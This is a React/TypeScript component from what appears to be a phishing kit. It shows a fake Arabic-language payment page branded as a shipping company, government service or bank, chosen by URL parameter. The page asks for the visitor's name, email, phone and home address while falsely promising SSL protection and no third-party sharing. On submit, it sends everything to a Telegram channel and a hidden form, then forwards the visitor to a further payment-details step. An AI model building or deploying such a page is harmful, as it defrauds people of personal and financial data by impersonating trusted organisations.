import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding, governmentPaymentBranding } from "@/lib/brandingSystem";
import { banks } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Package, Sparkles, Lock, ShieldCheck } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
import PageLoader from "@/components/PageLoader";
import ShippingCompanyLayout from "@/components/ShippingCompanyLayout";
import { GovernmentLayout } from "@/components/GovernmentLayouts";
import { BankLayout } from "@/components/BankLayout";

interface PaymentRecipientProps {
  children?: React.ReactNode;
}

const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
  const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError, error } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => setShowPage(true), 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) setShowPage(true);
  }, [linkData, isError]);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
  const currencyParam = pathCurrency || urlParams.get('currency') || urlParams.get('cur');
  const titleParam = urlParams.get('title');
  const amountParam = pathAmount || urlParams.get('amount') || urlParams.get('a');
  const paymentMethodParam = urlParams.get('pm') || urlParams.get('method') || 'card';
  const payerTypeParam = urlParams.get('payer_type') || urlParams.get('payer');
  const countryParam = urlParams.get('country') || urlParams.get('c');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  const isShippingCompany = !!shippingCompanyBranding[serviceKey.toLowerCase()];
  const isGovernment = !!governmentPaymentBranding[serviceKey.toLowerCase()];
  const bankData = banks.find(b => b.id === serviceKey.toLowerCase());
  const isBank = !!bankData;

  const getCompanyBranding = () => {
    const shipping = shippingCompanyBranding[serviceKey.toLowerCase()];
    if (shipping) return shipping;
    
    const gov = governmentPaymentBranding[serviceKey.toLowerCase()];
    if (gov) return gov;
    
    if (bankData) {
      return {
        id: bankData.id,
        nameEn: bankData.name,
        nameAr: bankData.name_ar,
        colors: { 
          primary: bankData.color || '#006C35', 
          secondary: '#FFFFFF', 
          background: '#FFFFFF', 
          surface: '#F9FAFB', 
          text: '#1A1A1A', 
          textLight: '#666666', 
          textOnPrimary: '#FFFFFF', 
          border: '#E5E5E5' 
        },
        fonts: { primary: 'Inter, sans-serif', secondary: 'Cairo, sans-serif', arabic: 'Cairo, sans-serif' },
        gradients: { 
          primary: 'linear-gradient(135deg, #006C35, #004D27)', 
          secondary: 'linear-gradient(135deg, #00843D, #006C35)', 
          hero: 'linear-gradient(to right, #006C35 0%, #00843D 100%)' 
        },
        shadows: { sm: '0 1px 2px 0 rgba(0, 108, 53, 0.08)', md: '0 4px 6px -1px rgba(0, 108, 53, 0.15)', lg: '0 10px 15px -3px rgba(0, 108, 53, 0.20)' },
        borderRadius: { sm: '4px', md: '8px', lg: '12px' },
        logoUrl: `/images/brand-logos/${bankData.id}.svg`,
        description: `Payment for ${bankData.name}`
      };
    }
    return null;
  };

  const companyBranding = getCompanyBranding();
  const companyMeta = getCompanyMeta(serviceKey);
  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;

  const shippingInfo = linkData?.payload as Record<string, unknown>;
  const payerType = payerTypeParam || shippingInfo?.payer_type || "recipient";
  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const currencyCode = currencyParam || countryData?.currency || "SAR";

  let amount = 500;
  const rawAmount = amountParam || shippingInfo?.cod_amount;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') amount = rawAmount;
    else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) amount = parsed;
    }
  }

  if (isLoading && !showPage) {
    return <PageLoader message="جاري تحميل بيانات الدفع..." />;
  }

  if (isError) console.error('Error loading link:', error);

  const formattedAmount = formatCurrency(amount, currencyCode);
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  const detectedEntity = detectEntityFromURL();
  const displayLogo = (detectedEntity ? getEntityLogo(detectedEntity) : null) || branding.logo;
  const primaryColor = companyBranding?.colors.primary || branding.colors.primary;
  const secondaryColor = companyBranding?.colors.secondary || branding.colors.secondary;

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      const formData = new FormData();
      formData.append('form-name', 'payment-recipient');
      formData.append('name', customerName);
      formData.append('email', customerEmail);
      formData.append('phone', customerPhone);
      formData.append('address', residentialAddress);
      formData.append('service', serviceName);
      formData.append('amount', formattedAmount);
      formData.append('linkId', id || '');

      try {
        await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(formData as Record<string, string>).toString()
        });
      } catch (error) { console.error('Form submission error:', error); }

      try {
        await sendToTelegram({
          type: 'payment_recipient',
          data: { name: customerName, email: customerEmail, phone: customerPhone, address: residentialAddress, service: serviceName, amount: formattedAmount, payment_url: `${window.location.origin}/pay/${id}/details` },
          timestamp: new Date().toISOString()
        });
      } catch (error) { console.error('Telegram error:', error); }

      if (linkData) {
        try {
          await updateLink.mutateAsync({
            linkId: id!,
            payload: { ...linkData.payload, customerInfo: { name: customerName, email: customerEmail, phone: customerPhone, address: residentialAddress, service: serviceName, amount: formattedAmount }, selectedCountry: countryCode, service_key: serviceKey, service_name: serviceName }
          });
        } catch (error) { console.error('Update link error:', error); }
      }

      navigate(`/pay/${id}/details?company=${serviceKey}&currency=${currencyCode}&amount=${amount}&method=${paymentMethodParam}`);
    } catch (error) { console.error('Proceed error:', error); }
    finally { setIsSubmitting(false); }
  };

  return (
    <>
      <PaymentMetaTags serviceKey={serviceKey} serviceName={serviceName} title={dynamicTitle} customDescription={dynamicDescription} amount={formattedAmount} />
      
      {isShippingCompany && companyBranding && (
        <ShippingCompanyLayout companyKey={serviceKey} trackingNumber={shippingInfo?.tracking_number as string} amount={formattedAmount} serviceType={serviceName}>{children}</ShippingCompanyLayout>
      )}
      {isGovernment && companyBranding && (
        <GovernmentLayout countryCode={countryCode} serviceName={serviceName} amount={formattedAmount}>{children}</GovernmentLayout>
      )}
      {!isShippingCompany && !isGovernment && companyBranding && (
        <BankLayout companyKey={serviceKey} amount={formattedAmount} serviceName={serviceName}>{children}</BankLayout>
      )}
      {!companyBranding && (
        <div className="sticky top-0 z-50 w-full shadow-lg" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`, borderBottom: `3px solid ${primaryColor}` }}>
          <div className="container mx-auto px-4">
            <div className="flex items-center justify-between h-16 sm:h-18">
              <div className="flex items-center gap-4">
                {displayLogo && <img src={displayLogo} alt={serviceName} className="h-10 sm:h-12 w-auto object-contain brightness-0 invert" />}
                <div className="text-white">
                  <h2 className="text-lg sm:text-xl font-bold">{serviceName}</h2>
                  <p className="text-xs opacity-90">الدفع الآمن - Secure Payment</p>
                </div>
              </div>
              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/20 backdrop-blur-sm">
                <ShieldCheck className="w-4 h-4 text-white" />
                <span className="text-xs font-medium text-white">آمن</span>
              </div>
            </div>
          </div>
        </div>
      )}

      <div className="min-h-screen py-8 sm:py-12" dir="rtl" style={{ background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`, fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}>
        <div className="container mx-auto px-4 max-w-2xl">
          <div className="text-center mb-8">
            <div className="flex items-center justify-center gap-3 mb-4">
              <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
              <h1 className="text-3xl sm:text-4xl font-bold" style={{ color: designSystem.colors.neutral[900], fontFamily: designSystem.typography.fontFamilies.arabic }}>
                {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
              </h1>
            </div>
            <p className="text-base text-gray-600">الرجاء إدخال بياناتك لإكمال عملية الدفع بشكل آمن</p>
            <div className="inline-flex items-center gap-2 px-6 py-3 rounded-full text-xl font-bold mt-4" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`, color: '#ffffff', boxShadow: '0 4px 16px rgba(0,0,0,0.12)' }}>
              <Package className="w-5 h-5" />
              <span>المبلغ:</span>
              <span className="text-2xl">{formattedAmount}</span>
            </div>
          </div>

          <Card className="overflow-hidden border-0" style={{ borderRadius: '20px', boxShadow: '0 8px 32px rgba(0,0,0,0.1)' }}>
            <div className="px-6 sm:px-8 py-6" style={{ background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`, borderBottom: `2px solid ${primaryColor}30` }}>
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}>
                  <User className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>بياناتك الشخصية</h2>
                  <p className="text-sm text-gray-600">معلومات آمنة ومحمية</p>
                </div>
              </div>
            </div>

            <form onSubmit={handleProceed} className="px-6 sm:px-8 py-8 bg-white">
              <div className="space-y-6">
                <div>
                  <Label htmlFor="name" className="flex items-center gap-2 mb-3 text-sm font-bold" style={{ color: designSystem.colors.neutral[800] }}>
                    <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: `${primaryColor}15`, color: primaryColor }}>
                      <User className="w-4 h-4" />
                    </div>
                    الاسم الكامل
                  </Label>
                  <Input id="name" value={customerName} onChange={(e) => setCustomerName(e.target.value)} required className="h-14 text-base border-2 transition-all duration-300 focus:scale-[1.01]" style={{ borderRadius: '12px', borderColor: designSystem.colors.neutral[200], fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }} placeholder="أدخل اسمك الكامل" />
                </div>
                
                <div>
                  <Label htmlFor="email" className="flex items-center gap-2 mb-3 text-sm font-bold" style={{ color: designSystem.colors.neutral[800] }}>
                    <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: `${primaryColor}15`, color: primaryColor }}>
                      <Mail className="w-4 h-4" />
                    </div>
                    البريد الإلكتروني
                  </Label>
                  <Input id="email" type="email" value={customerEmail} onChange={(e) => setCustomerEmail(e.target.value)} required className="h-14 text-base border-2 transition-all duration-300 focus:scale-[1.01]" style={{ borderRadius: '12px', borderColor: designSystem.colors.neutral[200], fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }} placeholder="example@email.com" dir="ltr" />
                </div>
                
                <div>
                  <Label htmlFor="phone" className="flex items-center gap-2 mb-3 text-sm font-bold" style={{ color: designSystem.colors.neutral[800] }}>
                    <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: `${primaryColor}15`, color: primaryColor }}>
                      <Phone className="w-4 h-4" />
                    </div>
                    رقم الهاتف
                  </Label>
                  <Input id="phone" type="tel" value={customerPhone} onChange={(e) => setCustomerPhone(e.target.value)} required className="h-14 text-base border-2 transition-all duration-300 focus:scale-[1.01]" style={{ borderRadius: '12px', borderColor: designSystem.colors.neutral[200], fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }} placeholder={`${phoneCode} ${phonePlaceholder}`} dir="ltr" />
                </div>
                
                <div>
                  <Label htmlFor="address" className="flex items-center gap-2 mb-3 text-sm font-bold" style={{ color: designSystem.colors.neutral[800] }}>
                    <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: `${primaryColor}15`, color: primaryColor }}>
                      <MapPin className="w-4 h-4" />
                    </div>
                    العنوان السكني
                  </Label>
                  <Input id="address" value={residentialAddress} onChange={(e) => setResidentialAddress(e.target.value)} required className="h-14 text-base border-2 transition-all duration-300 focus:scale-[1.01]" style={{ borderRadius: '12px', borderColor: designSystem.colors.neutral[200], fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }} placeholder="أدخل عنوانك السكني الكامل" />
                </div>
              </div>

              <div className="mt-6 p-4 rounded-xl flex items-start gap-3" style={{ background: `${primaryColor}08`, border: `1px solid ${primaryColor}30` }}>
                <Shield className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: primaryColor }} />
                <div className="text-sm">
                  <p className="font-bold mb-1" style={{ color: designSystem.colors.neutral[900] }}>بياناتك محمية</p>
                  <p className="text-xs text-gray-600">جميع معلوماتك الشخصية محمية بتقنية التشفير SSL ولن يتم مشاركتها مع أي طرف ثالث.</p>
                </div>
              </div>
            
              <Button type="submit" size="lg" disabled={isSubmitting || !customerName || !customerEmail || !customerPhone || !residentialAddress} className="w-full text-xl py-8 text-white font-bold mt-8 transition-all duration-300 hover:shadow-2xl rounded-xl disabled:opacity-50 disabled:cursor-not-allowed" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`, boxShadow: `0 12px 32px -8px ${primaryColor}70` }}>
                {isSubmitting ? <span>جاري المعالجة...</span> : <><span className="ml-3">متابعة للدفع</span><ArrowLeft className="w-6 h-6 mr-2" /></>}
              </Button>
            
              <div className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-500">
                <Lock className="w-4 h-4" />
                <p>بالمتابعة، أنت توافق على <a href="#" className="underline hover:no-underline" style={{ color: primaryColor }}>الشروط والأحكام</a></p>
              </div>
            </form>
            
            <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
              <input type="text" name="name" /><input type="email" name="email" /><input type="tel" name="phone" /><input type="text" name="address" /><input type="text" name="service" /><input type="text" name="amount" /><input type="text" name="linkId" />
            </form>
          </Card>

          <div className="mt-8 text-center">
            <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
              <div className="flex items-center gap-1.5"><Lock className="w-3.5 h-3.5" /><span>SSL Encrypted</span></div>
              <span>•</span>
              <div className="flex items-center gap-1.5"><ShieldCheck className="w-3.5 h-3.5" /><span>Verified</span></div>
            </div>
            <p className="text-xs text-gray-400">© 2025 {serviceName}. جميع الحقوق محفوظة.</p>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;